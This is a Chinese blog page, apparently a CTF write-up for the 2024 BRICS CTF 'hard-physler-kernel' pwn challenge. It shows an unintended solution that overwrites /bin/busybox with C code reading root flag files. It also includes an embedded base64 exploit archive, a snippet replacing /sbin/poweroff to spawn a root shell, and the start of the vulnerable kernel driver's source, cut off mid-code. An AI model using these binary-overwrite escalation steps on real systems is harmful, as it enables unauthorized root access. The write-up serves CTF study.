<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="zh-CN" data-mode="dark">
  <head>
  <style>
    #canvas-dust {
      z-index: -65536;
      pointer-events: none;
      position: fixed;
      top: 0;
      left: 0;
    }
  </style>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" >
  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- Setup Open Graph image -->

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.3" />
<meta property="og:title" content="2024-BRISC-CTF-Pwn-WriteUps" />
<meta name="author" content="imLZH1" />
<meta property="og:locale" content="zh_CN" />
<meta name="description" content="hard-physler-kernel 非预期做法" />
<meta property="og:description" content="hard-physler-kernel 非预期做法" />
<link rel="canonical" href="http://localhost:4000/posts/BRISC-CTF/" />
<meta property="og:url" content="http://localhost:4000/posts/BRISC-CTF/" />
<meta property="og:site_name" content="imLZH1’ Blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2025-01-07T00:00:00+08:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="2024-BRISC-CTF-Pwn-WriteUps" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"imLZH1"},"dateModified":"2025-01-07T00:00:00+08:00","datePublished":"2025-01-07T00:00:00+08:00","description":"hard-physler-kernel 非预期做法","headline":"2024-BRISC-CTF-Pwn-WriteUps","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/BRISC-CTF/"},"url":"http://localhost:4000/posts/BRISC-CTF/"}</script>
<!-- End Jekyll SEO tag -->


  <title>2024-BRISC-CTF-Pwn-WriteUps | imLZH1' Blog
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="imLZH1' Blog">
<meta name="application-name" content="imLZH1' Blog">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  
    

    <link rel="stylesheet" href="/assets/lib/fonts/main.css">
  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="/assets/lib/bootstrap/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="/assets/lib/fontawesome-free/css/all.min.css">

  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  
    <link rel="stylesheet" href="/assets/lib/tocbot/tocbot.min.css">
  

  
    <link rel="stylesheet" href="/assets/lib/loading-attribute-polyfill/loading-attribute-polyfill.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="/assets/lib/magnific-popup/magnific-popup.css">
  

  <!-- JavaScript -->

  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<canvas id="canvas-dust"></canvas>
<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle"><img src="/assets/img/tx.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>

    <h1 class="site-title">
      <a href="/">imLZH1' Blog</a>
    </h1>
    <!--
    <p class="site-subtitle fst-italic mb-0"></p>
    -->
    <p id="copywriting" class="site-subtitle fst-italic mb-0"></p>

    <script text="javascript">
          fetch('/assets/index_about.json',{headers:({
            'copywriting.jsion': 'application/x-www-form-urlencoded'
          })})
          .then(function(response) {
            return response.json();
          })
          .then(function(myJson) {
            var max = myJson.length;
            var copywritingId = Math.ceil(Math.random()*max)-1;
            console.log(`%c
      _    _.--.____.--._
     ( )=.-":;:;:;;':;:;:;"-._
      \\\\:;:;:;:;:;;:;::;:;:;:\\
       \\\\:;:;:;:;:;;:;:;:;:;:;\\
        \\\\:;::;:;:;:;:;::;:;:;:\\
         \\\\:;:;:;:;:;;:;::;:;:;:\\
          \\\\:;::;:;:;:;:;::;:;:;:\\
           \\\\;;:;:_:--:_:_:--:_;:;\\
            \\\\_.-"             "-._\\
             \\\\
              \\\\
               \\\\
                \\\\
                 \\\\
                  \\\\\ `,'color: #03A9F4; font-weight: bold');
            console.log(`%c `+myJson[copywritingId], `color: #03A9F4; font-weight: bold`);
            document.getElementById('copywriting').innerHTML = myJson[copywritingId];
          });
          </script>
	<script>
		'use strict';
		function getElement(string, item = document.documentElement) {
		    let tmp = item.querySelector(string);
		    if (tmp === null) {
			throw new Error("Unknown HTML");
		    }
		    return tmp;
		}
		function getParent(item, level = 1) {
		    while (level--) {
			let tmp = item.parentElement;
			if (tmp === null) {
			    throw new Error("Unknown HTML");
			}
			item = tmp;
		    }
		    return item;
		}
		function format(format, ...args) {
		    return format.replaceAll(/\$\*?[0-9]*/g, (match) => {
			if (match === '$*') {
			    return '';
			}
			let Index = match.slice(1);
			if (Index >= args.length) {
			    return '';
			}
			return args[Index];
		    });
		}
		class dust {
		    constructor(x = 50, y = 50) {
			this.vx = Math.random() * 1 + 1;
			this.vy = Math.random() * 1 + 0.01;
			this.shadowBlur = Math.random() * 3;
			this.shadowX = (Math.random() * 2) - 1;
			this.shadowY = (Math.random() * 2) - 1;
			this.radiusX = Math.random() * 1.5 + 0.5;
			this.radiusY = this.radiusX * (Math.random() * (1.3 - 0.3) + 0.3);
			this.rotation = Math.PI * Math.floor(Math.random() * 2);
			this.x = x;
			this.y = y;
		    }
		}
		class canvasDust {
		    constructor(canvasID) {
			this.color = '#fff';
			this.width = 300;
			this.height = 300;
			this.dustQuantity = 50;
			this.dustArr = [];
			this.inStop = false;
			this.build = () => {
			    this.resize();
			    if (this.ctx) {
				const point = canvasDust.getPoint(this.dustQuantity);
				for (let i of point) {
				    const dustObj = new dust(i[0], i[1]);
				    this.buildDust(dustObj);
				    this.dustArr.push(dustObj);
				}
				requestAnimationFrame(this.paint);
			    }
			};
			this.paint = () => {
			    if (this.inStop) {
				return;
			    }
			    const dustArr = this.dustArr;
			    for (let i of dustArr) {
				this.ctx.clearRect(i.x - 6, i.y - 6, 12, 12);
				if (i.x < -5 || i.y < -5) {
				    const x = this.width;
				    const y = Math.floor(Math.random() * window.innerHeight);
				    i.x = x;
				    i.y = y;
				}
				else {
				    i.x -= i.vx;
				    i.y -= i.vy;
				}
			    }
			    for (let i of dustArr) {
				this.buildDust(i);
			    }
			    requestAnimationFrame(this.paint);
			};
			this.buildDust = (dust) => {
			    const ctx = this.ctx;
			    ctx.beginPath();
			    ctx.shadowBlur = dust.shadowBlur;
			    ctx.shadowOffsetX = dust.shadowX;
			    ctx.shadowOffsetY = dust.shadowY;
			    ctx.ellipse(dust.x, dust.y, dust.radiusX, dust.radiusY, dust.rotation, 0, Math.PI * 2);
			    ctx.closePath();
			    ctx.fill();
			};
			this.resize = () => {
			    const canvas = this.canvas;
			    const width = window.innerWidth;
			    const height = window.innerHeight;
			    this.width = width;
			    this.height = height;
			    this.dustQuantity = Math.floor((width + height) / 38);
			    canvas.width = width;
			    canvas.height = height;
			    this.ctx.shadowColor =
				this.ctx.fillStyle = this.color;
			};
			this.stop = () => {
			    this.inStop = true;
			};
			this.play = () => {
			    if (this.inStop === true) {
				this.inStop = false;
				requestAnimationFrame(this.paint);
			    }
			};
			const canvas = getElement(canvasID);
			this.canvas = canvas;
			this.ctx = this.canvas.getContext('2d');
			this.build();
			window.addEventListener('resize', this.resize);
		    }
		}
		canvasDust.getPoint = (number = 1) => {
		    let point = [];
		    for (let i = 0; i < number; ++i) {
			const x = Math.floor(Math.random() * window.innerWidth);
			const y = Math.floor(Math.random() * window.innerHeight);
			point.push([x, y]);
		    }
		    return point;
		};
		try {
		    var canvasDusts = new canvasDust('#canvas-dust');
		}
		catch (e) { }
	  </script>	
	  


  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>首页</span>
        </a>
      </li>
      <!-- the real tabs -->
      
        <li class="nav-item">
          <a href="/archives/" class="nav-link">
            <i class="fa-fw fas fa-archive"></i>
            

            <span>归档</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/about/" class="nav-link">
            <i class="fa-fw fas fa-info-circle"></i>
            

            <span>关于</span>
          </a>
        </li>
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    

    
      

      
        <a
          href="https://github.com/imLZH1"
          aria-label="github"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-github-alt"></i>
        </a>
      
    
      

      
        <a
          href="javascript:location.href = 'mailto:' + ['qingwachong','qq.com'].join('@')"
          aria-label="email"
          

          

          

          
        >
          <i class="fas fa-envelope"></i>
        </a>
      
    
      

      
        <a
          href="/feed.xml"
          aria-label="rss"
          

          

          

          
        >
          <i class="fas fa-rss"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" aria-label="Top Bar">
  <div
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">
                首页
              </a>
            </span>

          
        
          
        
          
            
              <span>2024-BRISC-CTF-Pwn-WriteUps</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      文章
    </div>

    <button type="button" id="search-trigger" class="btn btn-link">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="搜索..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">取消</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  

  
  

  




<!-- return -->




<article class="px-1">
  <header>
    <h1 data-toc-skip>2024-BRISC-CTF-Pwn-WriteUps</h1>

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        发表于
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1736179200"
  data-df="YYYY/MM/DD"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  2025/01/07
</time>

      </span>

      <!-- lastmod date -->
      

      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          作者

          <em>
            
              
                
                
              
            
          </em>
        </span>

        <!-- read time -->
        <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="4579 字"
>
  <em>25 分钟</em>阅读</span>

      </div>
      <!-- .d-flex -->
    </div>
    <!-- .post-meta -->
  </header>

  <div class="content">
    <h2 id="hard-physler-kernel"><span class="me-2">hard-physler-kernel</span><a href="#hard-physler-kernel" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<h3 id="非预期做法"><span class="me-2">非预期做法</span><a href="#非预期做法" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<ul>
  <li>权限没设置好，全部都时 rwx</li>
</ul>

<p>​<a href="/assets/img/2025-CTFWP-images/2024-BRISC-CTF/assets/image-20250101144545-x4qy01t.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2024-BRISC-CTF/assets/image-20250101144545-x4qy01t.png" alt="image" loading="lazy"></a>​</p>

<p>把 /bin/busybox 文件覆盖，然后 exit</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2024-BRISC-CTF/assets/image-20250101145715-x79i8pe.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2024-BRISC-CTF/assets/image-20250101145715-x79i8pe.png" alt="image" loading="lazy"></a>​</p>

<ul>
  <li>exploit</li>
</ul>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre></td><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">"minilib.h"</span><span class="cp">
</span>
<span class="k">extern</span> <span class="kt">void</span> <span class="nf">_start</span><span class="p">(){</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">files</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s">"/flag"</span><span class="p">,</span>
        <span class="s">"/flag.txt"</span><span class="p">,</span>
        <span class="s">"/root/flag"</span><span class="p">,</span>
        <span class="s">"/root/flag.txt"</span><span class="p">,</span>
        <span class="mi">0</span><span class="p">};</span>

    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">files</span><span class="p">[</span><span class="n">i</span><span class="p">];</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
        <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">files</span><span class="p">[</span><span class="n">i</span><span class="p">],</span><span class="mi">0</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="n">fd</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">){</span>
            <span class="n">sendfile</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="n">syscall64</span><span class="p">(</span><span class="mi">60</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">//UEsDBBQAAAAIAOd2IVr0kO2YrAMAACglAAAHABwAZXhwbG9pdFVUCQAD0uZ0Z9LmdGd1eAsAAQQAAAAABAAAAADtWktrE1EUPol9pEVtFEXBIqMEqUin6cNWi49oO+0VWkUlC1EJSTNtCnmUZAZabXVRFK9B6Ur7C4obXzt10RaLNrqqG+mym0pAwYoFixTjvTN3kpkp8YUIwv3InXPPOd93zmQmWUxyrkpdHU6HAww44QhQ747bp/k+Fr+3O08hsQNQTo6VUKFxS8AMn8Wud4LFgls3VFdq8oH1M6zETsmwZp3WT2BxwWe1Bt+mK2Erw+IZh89i8+WYdYFVl2W6LOMb1sN4HhOf4uyiEv6TfqeJrgx+HcblK2F7ek07T/rJfYRpGltnym9hPs1PBBpntr8b2e86ef9u5hTedvzNVOtvtOXg4ODg4ODg4ODg4OD4z/C5audXP8KLCK8g/AXhtwi/7sbPu3GmK93lcVWVjl2cyXNGP7gRHlnB6nLav4zSEpG8nKIP9k9oqeyjXC73yswWKBthdQlhfxbh7gWUVsnqzqK0f4nqT+AlWqImXyJGSoxZanjRrdLbVQAIS3Nki/XtPNne0LcLhW0WzUpLtM6stErNe19aWkXjKN3+Ym6SBhCezYqkBZZWRkdW4Eo1fQ/jT+mPBc/0/Msp+sCebSGkUWnVUdCja9PqY63I1KH86U5+0073394yDg4ODg4ODg4ODg4ODo7fRioCtT1QF+qP15FtJXjrGxqb9je3HDh47Hhbu9QBFcJhAQTyIge6hkGEYajrjQb79KOoDCpQl0wkFBbMb7UMwxZmHZfOgGPQ7dixvtw1Rh61q0Ffgx9zOe0/dGmj+7qzbUPZeUJgOfq8PUzyojkvF/IXyLpJ8u3m/OVCfpisByT/0Jx3TmiEzra2VqHGH1LjiirUN4qNore2WdXchisNTaK3aS8L//g66nMJn3L2eDlZm53r4Ayba2hn8a0sbsxZPGRxt7ZKAbw+S51qxjfmI4x5gz1F+LVF4g2sjofVEY2EPDgg9kBKjod7+6MyBAKhVCqQUoJJBVJDqZ5gNNrcBAE5HFSCxMTDkBiQ40SfGoopwRCxSlK3EWMXTyiy2BdXxYEk4SaVIVMopPZHw7X9YRAVmXxIxGRCKyzKkUBvMhiTQexJxGJyXIG/hB2g3wtjDKUwj6H7go3vsvmiTV+YA9F9j41fYvOPgf4Zyc925OdddCM5rHybC50sZvQvzL3oJmjj2/WnbPoI00eYftzGt7//c0y/5muwSzf7ivQ3WyeshZfp5019nab+25mtgMIsi+U82VxSS5H+BjYV0R9l+tBP9N8BUEsBAh4DFAAAAAgA53YhWvSQ7ZisAwAAKCUAAAcAGAAAAAAAAAAAAO2BAAAAAGV4cGxvaXRVVAUAA9LmdGd1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBNAAAA7QMAAAAA</span>
<span class="c1">// echo -n ""|	base64 -d &gt; exp.zip &amp;&amp; unzip exp.zip</span>
</pre></td></tr></tbody></table></code></div></div>
<p>‍</p>

<pre><code class="language-url">https://github.com/AvavaAYA/ctf-writeup-collection/tree/main/BRICSCTF-2024/physler
</code></pre>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="n">cd</span> <span class="n">sbin</span>
<span class="n">rm</span> <span class="n">poweroff</span>
<span class="n">cat</span> <span class="o">&lt;&lt;</span> <span class="n">EOF</span> <span class="o">&gt;</span> <span class="p">.</span><span class="o">/</span><span class="n">poweroff</span> <span class="p">;</span> <span class="n">chmod</span> <span class="o">+</span><span class="n">x</span> <span class="p">.</span><span class="o">/</span><span class="n">poweroff</span>
<span class="c1">#!/bin/sh
</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sh</span>
<span class="n">EOF</span>
 
<span class="nb">exit</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>‍</p>

<h3 id="预期解法"><span class="me-2">预期解法</span><a href="#预期解法" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<p>题目给了源代码</p>

<p>​<code class="language-plaintext highlighter-rouge">physler.c</code>​</p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
</pre></td><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">"physler.h"</span><span class="cp">
</span>
<span class="k">static</span> <span class="n">noinline</span> <span class="kt">long</span> <span class="nf">ioctlHandler</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">cmd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">arg</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">struct</span> <span class="n">ioctl_map</span> <span class="n">_map</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">ioctl_write</span> <span class="n">_write</span><span class="p">;</span>

    <span class="k">switch</span> <span class="p">(</span><span class="n">cmd</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">case</span> <span class="n">IOCTL_MAP_PHYS_ADDR</span><span class="p">:</span> <span class="p">{</span>

            <span class="k">if</span> <span class="p">(</span><span class="n">copy_from_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">_map</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">arg</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">_map</span><span class="p">)))</span> <span class="p">{</span>
                <span class="k">return</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="k">if</span> <span class="p">(</span><span class="n">mem</span><span class="p">)</span>
